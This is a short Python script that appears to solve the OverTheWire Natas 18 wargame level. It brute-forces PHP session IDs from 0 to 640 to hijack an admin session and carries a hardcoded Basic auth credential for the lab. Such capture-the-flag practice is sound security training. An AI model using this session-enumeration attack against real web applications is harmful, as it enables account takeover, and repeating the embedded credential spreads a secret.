import requests
url = "http://natas18.natas.labs.overthewire.org/index.php"
headers = {"Authorization":"Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg=="}
for i in range(641):
    r = requests.post(url, headers=headers, cookies={"PHPSESSID":str(i)})
    if "You are an admin" in r.text:
        print(r.text)
        break
